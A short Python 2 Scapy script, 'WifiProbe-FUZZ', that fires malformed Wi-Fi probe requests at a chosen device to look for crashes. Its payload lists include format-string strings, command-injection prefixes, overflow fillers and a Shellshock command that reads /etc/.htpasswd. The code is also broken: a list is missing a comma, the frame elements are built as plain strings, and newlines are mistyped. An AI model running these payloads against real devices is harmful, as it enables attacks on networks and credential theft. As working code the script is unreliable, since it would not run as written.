#!/usr/bin/env python2

import threading
import string
from scapy.all import *

logfile = "wifiprobe.txt"
interface = "mon0"
		
def banner():
  print("WifiProbe-FUZZ -- v1.1 (Red Dragon Productions)")
  print("")
  print("This tool is designed to fuzz test wireless probes.")
  print("You should monitor the wireless device, if the device dissapears from view")
  print("then there is a possibility that the device is vulnerable to a buffer overflow attack.")
  print("")
  print("Please make sure your wireless card is set to monitor mode")
  print("Usage: ")
  print("python2 wifi_probe.py")

banner()
targets = raw_input("SSID> ")

def engine():
  for i in range(1,256):
    

    fmts   = ["%s"*i,"AAA%08$x","AAA%08%h","AAA%08$s","AAA%08$n","%s"*i,"AAA%080$u"]
    rc      = ["set","'set",":set","|set","$set"]
    io = [str(i)*i] 
    bonull = ["00"*i]
    bofull = ["FF"*i]
    sshock = ["env x='() { :;}; echo vulnerable' bash -c cat /etc/.htpasswd"]
    exploits = [fmts,rc,io bonull,bofull,sshock]
    for x in exploits[:]:
      tofuzz = [
        "Dot11Elt(ID="+str(x)+",info='00')", 
        "Dot11Elt(ID='SSID', len="+str(x)+",info='00')", 
        "Dot11Elt(ID='SSID', len=9,info="+str(x)+")", 
        "Dot11Elt(ID='RATES', info="+str(x)+")", 
        "Dot11Elt(ID='EXT RATES ',info="+str(x)+")",  
        "Dot11Elt(ID='DS PARAM', info="+str(x)+")",  
        "Dot11Elt(ID='COUNTRY', info="+str(x)+")", 
        "Dot11Elt(ID='REQUEST',info="+str(x)+")", 
        "Dot11Elt(ID='CHALLENGE TEXT ',info="+str(x)+")", 
        "Dot11Elt(ID='POWER CONSTRAINT',info="+str(x)+")", 
        "Dot11Elt(ID='POWER CAPAB ',info="+str(x)+")", 
        "Dot11Elt(ID='CHANNELS',info="+str(x)+")", 
        "Dot11Elt(ID='ERP INFO',info="+str(x)+")", 
        "Dot11Elt(ID='ERP NONERP PRESENT',info="+str(x)+")", 
        "Dot11Elt(ID='CHANNELS CHANNEL BAND',info="+str(x)+")", 
        "Dot11Elt(ID='ERP BARKER LONG',info="+str(x)+")", 
        "Dot11Elt(ID='RSN',info="+str(x)+")", 
        "Dot11Elt(ID='VENDOR',info="+str(x)+")", 
        "Dot11Elt(ID='COUNTRY TRIPLET',info="+str(x)+")", 
        "Dot11Elt(ID='COUNTRY BAND TRIPLET',info="+str(x)+")", 
        "Dot11Elt(ID='COUNTRY EXT TRIPLET',info="+str(x)+")"]
      for a in tofuzz[:]:
        resp = srp(
          RadioTap()/
          Dot11(type=0,subtype=0100,addr2=targets)/
          Dot11ProbeReq()/
          a,timeout=4)

#Threads

def getresp(p):
  logfile = open("wifiprobe.txt","a")
  dframe = (4,5)
  if p.haslayer(Dot11):
    if p.addr1 == targets:
      if p.type == 0 and p.subtype in dframe:
        logfile.write(hexdump(p)+"/n/n")
        print(hexdump(p)+"/n/n")

t = threading.Thread(target = engine)
t.start()
while True:
  logfile = open("wifiprobe.txt","a")
  sniff(prn=getresp, count=1)
